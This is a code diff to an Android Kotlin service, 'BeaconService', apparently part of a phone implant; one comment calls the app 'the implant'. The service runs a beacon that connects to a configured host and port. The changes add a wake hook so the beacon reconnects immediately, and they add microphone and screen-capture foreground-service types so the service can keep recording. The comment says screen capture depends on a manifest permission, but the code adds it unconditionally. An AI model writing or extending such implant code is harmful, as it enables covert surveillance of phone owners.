@@ -6,6 +6,8 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
@@ -24,6 +26,22 @@ class BeaconService : Service(), Beacon.Listener {
         const val NOTIFICATION_ID = 4711
         const val ACTION_STOP = "io.umbra.beacon.STOP"
         private val active = AtomicBoolean(false)
+
+        /**
+         * The beacon that runs, so that a watcher can ask it to connect
+         * again right now.
+         */
+        @Volatile private var running: Beacon? = null
+
+        /**
+         * Ask the beacon to connect again.
+         *
+         * The watchers of the phone use it: a message that arrives in the
+         * middle of the night does not wait for the end of the sleep.
+         */
+        fun wake() {
+            running?.wake()
+        }
 
         fun isActive(): Boolean = active.get()
 
@@ -60,7 +78,42 @@ class BeaconService : Service(), Beacon.Listener {
     override fun onCreate() {
         super.onCreate()
         createChannel()
-        startForeground(NOTIFICATION_ID, notification("starting…"))
+        // The service carries the type of the microphone and the type of
+        // the capture of the screen, and the system refuses a type whose
+        // permission is missing: only the types the user granted are
+        // announced.
+        val types = foregroundTypes()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(NOTIFICATION_ID, notification("starting…"), types)
+        } else {
+            startForeground(NOTIFICATION_ID, notification("starting…"))
+        }
+    }
+
+    /**
+     * The types of the foreground service.
+     *
+     * The data sync is always there; the microphone comes when the user
+     * granted the microphone, and the capture of the screen comes when
+     * the permission of the foreground service of that type is in the
+     * manifest.
+     */
+    private fun foregroundTypes(): Int {
+        var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+        if (granted(android.Manifest.permission.RECORD_AUDIO)) {
+            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+        }
+        types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+        return types
+    }
+
+    /** Is the permission granted to the implant right now? */
+    private fun granted(permission: String): Boolean {
+        return try {
+            checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED
+        } catch (_: Throwable) {
+            false
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -83,6 +136,7 @@ class BeaconService : Service(), Beacon.Listener {
         active.set(true)
         val b = Beacon(cfg, this)
         beacon = b
+        running = b
         b.start()
         notify("beacon running -> ${Addr.hostPort(cfg.host, cfg.port)}")
     }
@@ -90,6 +144,7 @@ class BeaconService : Service(), Beacon.Listener {
     private fun stopBeacon() {
         beacon?.stop()
         beacon = null
+        running = null
         active.set(false)
         releaseWakeLock()
         stopForeground(true)
